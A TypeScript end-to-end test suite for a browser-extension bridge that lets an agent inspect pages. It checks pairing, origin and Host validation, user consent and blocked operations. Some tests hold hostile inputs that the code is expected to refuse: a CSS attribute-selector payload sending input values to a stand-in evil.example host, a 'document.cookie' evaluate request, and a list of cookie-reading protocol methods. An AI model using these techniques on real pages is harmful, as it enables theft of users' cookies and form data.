/**
 * Extension bridge e2e: a real Chrome loads the BUILT extension
 * (extension/dist/chrome — run `npm run build:extension` first), the extension
 * dials the BridgeServer, the test approves pairing through the popup's own
 * message API, and the engine then inspects pages through chrome.debugger.
 *
 * Also covers the lite (Firefox) backend: the same collector the Firefox build
 * injects is run in a page here, behind a fake bridge client.
 */
import fs from 'node:fs'
import http from 'node:http'
import os from 'node:os'
import path from 'node:path'
import { fileURLToPath } from 'node:url'
import puppeteer, { type Browser, type Page } from 'puppeteer-core'
import { afterAll, beforeAll, describe, expect, it } from 'vitest'
import { findChromeExecutable, SessionManager } from '../src/session.js'
import { BridgeServer, CHROME_EXTENSION_ID, isExtensionOrigin, isLoopbackHost, type BridgeClient } from '../src/bridge/server.js'
import { LiteSession } from '../src/bridge/lite.js'
import { explainStylesTool } from '../src/tools/explain-styles.js'
import { pageSnapshotTool } from '../src/tools/page-snapshot.js'
import { solveTool } from '../src/tools/solve.js'
import { explainAnimationsTool } from '../src/tools/explain-animations.js'
import { getListenersTool } from '../src/tools/get-listeners.js'
// @ts-expect-error — plain JS module shared with the extension
import { vzCollect } from '../extension/src/collector.js'

const here = path.dirname(fileURLToPath(import.meta.url))
const fixtures = path.join(here, 'fixtures')
const extDir = path.resolve(here, '..', 'extension', 'dist', 'chrome')
const chromePath = findChromeExecutable()
const TEST_BASE = 17470
/** CI runners (Ubuntu 24.04 AppArmor) can't start Chrome's sandbox — same switch the engine honors. */
const sandboxArgs = process.env['VISIONAIRE_NO_SANDBOX'] === '1' ? ['--no-sandbox', '--disable-setuid-sandbox'] : []

function serveFixtures(): Promise<{ server: http.Server; base: string }> {
  const types: Record<string, string> = { '.html': 'text/html', '.css': 'text/css', '.js': 'text/javascript' }
  const server = http.createServer((req, res) => {
    const file = path.join(fixtures, decodeURIComponent(new URL(req.url ?? '/', 'http://x').pathname))
    if (!file.startsWith(fixtures) || !fs.existsSync(file) || fs.statSync(file).isDirectory()) {
      res.writeHead(404).end()
      return
    }
    res.writeHead(200, { 'content-type': types[path.extname(file)] ?? 'application/octet-stream' })
    fs.createReadStream(file).pipe(res)
  })
  return new Promise((resolve) => server.listen(0, '127.0.0.1', () => resolve({ server, base: `http://127.0.0.1:${(server.address() as { port: number }).port}` })))
}

describe('bridge security checks', () => {
  it('accepts only the pinned Chrome id and Firefox UUID origins', () => {
    expect(isExtensionOrigin(`chrome-extension://${CHROME_EXTENSION_ID}`)).toBe(true)
    expect(isExtensionOrigin('chrome-extension://abcdefghijklmnopabcdefghijklmnop')).toBe(false)
    expect(isExtensionOrigin('moz-extension://2f1c2c0e-1111-4a4a-9b9b-123456789abc')).toBe(true)
    expect(isExtensionOrigin('https://evil.example')).toBe(false)
    expect(isExtensionOrigin(undefined)).toBe(false)
  })
  it('rejects DNS-rebinding Host headers', () => {
    expect(isLoopbackHost('127.0.0.1:17337', 17337)).toBe(true)
    expect(isLoopbackHost('localhost:17337', 17337)).toBe(true)
    expect(isLoopbackHost('evil.example:17337', 17337)).toBe(false)
    expect(isLoopbackHost('127.0.0.1:9999', 17337)).toBe(false)
  })
})

describe.skipIf(!chromePath || !fs.existsSync(path.join(extDir, 'manifest.json')))('extension bridge — real Chrome + built extension', () => {
  let fixtureServer: http.Server
  let base = ''
  let bridge: BridgeServer
  let browser: Browser
  let session: SessionManager
  const home = fs.mkdtempSync(path.join(os.tmpdir(), 'vz-home-'))

  beforeAll(async () => {
    process.env['VISIONAIRE_HOME'] = home
    ;({ server: fixtureServer, base } = await serveFixtures())
    // Own port range, so live MCP sessions on the default port never interfere.
    bridge = new BridgeServer({ project: 'bridge-e2e', port: TEST_BASE })
    expect(await bridge.start()).toBeGreaterThan(0)

    browser = await puppeteer.launch({
      executablePath: chromePath,
      headless: true,
      pipe: true,
      enableExtensions: [extDir],
      // approve.example / other.example resolve to the fixture server: non-dev hosts that need consent.
      args: ['--no-first-run', '--no-default-browser-check', '--host-resolver-rules=MAP approve.example 127.0.0.1, MAP other.example 127.0.0.1', ...sandboxArgs],
    })

    // Pair exactly like the user would: the agent's connect opens a window and shows a
    // one-time code; the user pastes it into the popup (driven here through its message API).
    const { code } = bridge.openPairing()
    const popup = await browser.newPage()
    await popup.goto(`chrome-extension://${CHROME_EXTENSION_ID}/popup.html`)
    await popup.evaluate((basePort) => chrome.runtime.sendMessage({ type: 'popup.settings', basePort }), TEST_BASE)
    const deadline = Date.now() + 40_000
    for (;;) {
      const state = (await popup.evaluate(() => chrome.runtime.sendMessage({ type: 'popup.rescan' }))) as {
        servers: Array<{ port: number; status: string }>
      }
      if (state.servers.some((s) => s.port === bridge.port && s.status === 'pairing')) break
      if (Date.now() > deadline) throw new Error(`extension never reached pairing: ${JSON.stringify(state)}`)
      await new Promise((r) => setTimeout(r, 500))
    }
    // A wrong code is rejected and leaves the window open.
    const bad = (await popup.evaluate((port) => chrome.runtime.sendMessage({ type: 'popup.pair', port, code: 'AAAA-AAAA-AAAA' }), bridge.port)) as {
      servers: Array<{ port: number; status: string; error: string }>
    }
    expect(bad.servers.find((s) => s.port === bridge.port)?.error).toMatch(/wrong pairing code/)
    await popup.evaluate((port, c) => chrome.runtime.sendMessage({ type: 'popup.pair', port, code: c.toLowerCase() }), bridge.port, code)
    expect(await bridge.waitForClient(10_000)).toBeTruthy()
    await popup.close()

    session = new SessionManager(bridge)
  }, 90_000)

  afterAll(async () => {
    await session?.disconnect().catch(() => {})
    await browser?.close().catch(() => {})
    await bridge?.stop()
    fixtureServer?.close()
    delete process.env['VISIONAIRE_HOME']
    fs.rmSync(home, { recursive: true, force: true })
  })

  it('pairs with a one-time code and port-bound mutual HMAC', () => {
    const client = bridge.clients()[0]!
    expect(client.browser).toBe('chrome')
    expect(client.caps).toContain('cdp')
    expect(fs.statSync(path.join(home, 'bridge-token')).mode & 0o777).toBe(0o600)
  })

  it('opens the url in an agent tab and runs the full CDP engine through chrome.debugger', async () => {
    const ctx = await session.connect({ mode: 'extension', url: `${base}/cascade.html` })
    expect(ctx).toBeTruthy()
    expect(session.describe()).toMatch(/extension\/chrome tab \d+ \(full CDP\)/)
    const res = await explainStylesTool.handler(session.context(), { selector: '.hero-cta .btn', property: 'margin-bottom' })
    expect(res.text).toContain('theme.css:10')
    const snap = await pageSnapshotTool.handler(session.context(), {})
    expect(snap.text).toMatch(/Get started/)
  })

  it('solve routes a plain-language question end to end via the extension', async () => {
    const solve = solveTool(session)
    const res = await solve.handler(undefined as never, {
      intent: 'why is there 24px of margin under the Get started link',
      context: { element: '.hero-cta .btn' },
    })
    expect(res.text).toContain('solve → spacing-wrong')
    expect(res.text).toContain('theme.css:10')
    expect(res.text).toContain('NEXT:')
  })

  it('reuses its own tab on the next connect instead of opening another', async () => {
    const before = (await bridge.clients()[0]!.listTabs()).filter((t) => t.owned).length
    await session.connect({ mode: 'extension', url: `${base}/visibility.html` })
    const after = (await bridge.clients()[0]!.listTabs()).filter((t) => t.owned).length
    expect(after).toBe(before)
    expect(session.context().page.url()).toContain('visibility.html')
  })

  it('animations and listeners work through chrome.debugger', async () => {
    await session.connect({ mode: 'extension', url: `${base}/animations.html` })
    const anim = await explainAnimationsTool.handler(session.context(), { selector: '#spinner' })
    expect(anim.text).toMatch(/CSSAnimation/)
    await session.navigate(`${base}/listeners.html`)
    const ls = await getListenersTool.handler(session.context(), { selector: 'button' })
    expect(ls.text).toMatch(/click/)
  })

  it('reports a closed tab clearly instead of a raw protocol error', async () => {
    await session.connect({ mode: 'extension', url: `${base}/cascade.html` })
    const tabs = await bridge.clients()[0]!.listTabs()
    const mine = tabs.find((t) => t.owned)!
    await bridge.clients()[0]!.request('tabs.close', { tabId: mine.tabId })
    await new Promise((r) => setTimeout(r, 500))
    expect(() => session.context()).toThrow(/tab was closed.*connect again/)
    const r = await solveTool(session).handler(undefined as never, { intent: 'overview', scenario: 'page-overview' })
    expect(r.text).toMatch(/session ended: the inspected tab was closed/)
  })

  it('blocks cookie/storage protocol methods even on an approved tab', async () => {
    await session.connect({ mode: 'extension', url: `${base}/cascade.html` })
    const client = bridge.clients()[0]!
    const tabId = (await client.listTabs()).find((t) => t.owned)!.tabId
    for (const method of ['Network.getAllCookies', 'Network.getCookies', 'Storage.getCookies', 'Browser.getVersion', 'Target.createTarget']) {
      const err = await client.request('cdp.send', { tabId, method, params: {} }).catch((e: Error) => e.message)
      expect(String(err), method).toMatch(/blocked by the Visionaire extension/)
    }
  })

  it('asks the user before opening a non-dev site, and honours Deny', async () => {
    const client = bridge.clients()[0]!
    const port = new URL(base).port
    const seen = new Set<unknown>()
    const decide = async (decision: string): Promise<void> => {
      // a fresh consent window each time (the previous one may linger briefly after closing)
      const target = await browser.waitForTarget((t) => t.url().includes('/approve.html') && !seen.has(t), { timeout: 10_000 })
      seen.add(target)
      const page = (await target.page())!
      expect(await page.$eval('#origin', (e) => e.textContent)).toBe(`http://approve.example:${port}`)
      // the window closes itself on click, so the evaluate's reply may never arrive
      await page.evaluate((d) => document.getElementById(d)!.click(), decision).catch(() => {})
    }
    const [denied] = await Promise.all([
      client.request('tabs.open', { url: `http://approve.example:${port}/cascade.html` }, 30_000).catch((e: Error) => e.message),
      decide('deny'),
    ])
    expect(String(denied)).toMatch(/declined/)
    const [opened] = await Promise.all([
      session.connect({ mode: 'extension', url: `http://approve.example:${port}/cascade.html` }).then(() => 'ok'),
      // the agent's own tab is reused, so consent is asked on navigation
      decide('once'),
    ])
    expect(opened).toBe('ok')
    expect(session.context().page.url()).toContain('approve.example')
  })

  it('detaches the moment an inspected tab wanders to an unapproved site', async () => {
    const port = new URL(base).port
    // Page-initiated navigation (not via the agent's navigate) must still be caught.
    await session.context().page.evaluate((u) => setTimeout(() => (location.href = u), 50), `http://other.example:${port}/cascade.html`)
    await new Promise((r) => setTimeout(r, 2_000))
    expect(() => session.context()).toThrow(/navigated to http:\/\/other\.example.*not approved/)
  })

  it('refuses evaluate and resource-loading CSS in the user\'s browser', async () => {
    await session.connect({ mode: 'extension', url: `${base}/cascade.html` })
    const solve = solveTool(session)
    const ev = await solve.handler(undefined as never, { intent: 'x', tool: 'evaluate', args: { expression: 'document.cookie' } })
    expect(ev.text).toMatch(/evaluate is disabled in extension mode/)
    const css = await solve.handler(undefined as never, { intent: 'x', tool: 'inject_css', args: { css: 'input[value^=a]{background:url(https://evil.example/a)}' } })
    expect(css.text).toMatch(/refuses url\(\)/)
  })

  it('refuses tabs the user did not share', async () => {
    const page = await browser.newPage()
    await page.goto(`${base}/cascade.html`)
    const tabs = await bridge.clients()[0]!.listTabs()
    const unshared = await bridge.clients()[0]!.request('cdp.attach', { tabId: 999_999 }).catch((e: Error) => e.message)
    expect(String(unshared)).toMatch(/not shared/)
    expect(tabs.every((t) => t.owned || t.shared)).toBe(true)
    await page.close()
  })
})

/** Fake bridge client: runs the real collector in a puppeteer page (what the Firefox build does via scripting.executeScript). */
function fakeLiteClient(page: Page): BridgeClient {
  return {
    browser: 'firefox',
    caps: ['lite'],
    label: 'fake firefox',
    request: async (method: string, params: Record<string, unknown>) => {
      if (method === 'lite.run') return page.evaluate(vzCollect, params['cmd'] as string, params['args'] as Record<string, unknown>)
      if (method === 'lite.fetch') {
        const out: Record<string, string | null> = {}
        for (const u of params['urls'] as string[]) out[u] = await fetch(u).then((r) => (r.ok ? r.text() : null)).catch(() => null)
        return out
      }
      throw new Error(`fake client: ${method} not implemented`)
    },
  } as unknown as BridgeClient
}

describe.skipIf(!chromePath)('lite (Firefox) backend — collector + CSSOM cascade', () => {
  let fixtureServer: http.Server
  let base = ''
  let browser: Browser
  let page: Page
  let lite: LiteSession

  beforeAll(async () => {
    ;({ server: fixtureServer, base } = await serveFixtures())
    browser = await puppeteer.launch({ executablePath: chromePath, headless: true, args: sandboxArgs })
    page = await browser.newPage()
    lite = new LiteSession(fakeLiteClient(page), 1)
  })
  afterAll(async () => {
    await browser?.close().catch(() => {})
    fixtureServer?.close()
  })

  it('explains the cascade with file:line from CSSOM + fetched sources', async () => {
    await page.goto(`${base}/cascade.html`)
    const res = await lite.explain({ selector: '.hero-cta .btn' }, ['margin-bottom'])
    expect(res.text).toMatch(/margin-bottom = 24px/)
    expect(res.text).toMatch(/WINNER \.hero-cta \.btn → .*theme\.css:10/)
    expect(res.text).toMatch(/lost +12px from \.btn → .*plugin\.css:5 — lower specificity/)
  })

  it('reports !important and inline-style wins', async () => {
    const res = await lite.explain({ selector: '.hero-cta .btn' }, ['letter-spacing', 'color'])
    expect(res.text).toMatch(/letter-spacing = 1px !important[\s\S]*plugin\.css:7/)
    expect(res.text).toMatch(/color = #ffffff[\s\S]*inline style/)
  })

  it('snapshot gives uids that resolve in later calls', async () => {
    const snap = await lite.snapshot()
    const m = /\[(f\d+)\] a\.btn "Get started"/.exec(snap.text)
    expect(m, snap.text).toBeTruthy()
    const res = await lite.explain({ uid: m![1] }, ['margin-bottom'])
    expect(res.text).toContain('theme.css:10')
    expect(snap.text).toContain('untrusted="true"')
  })

  it('finds by text and lists animations', async () => {
    const { first } = await lite.find({ text: 'Get started' })
    expect(first?.desc).toBe('a.btn')
    await page.goto(`${base}/animations.html`)
    const anim = await lite.animations()
    expect(anim.text).toMatch(/CSSAnimation/)
  })
})
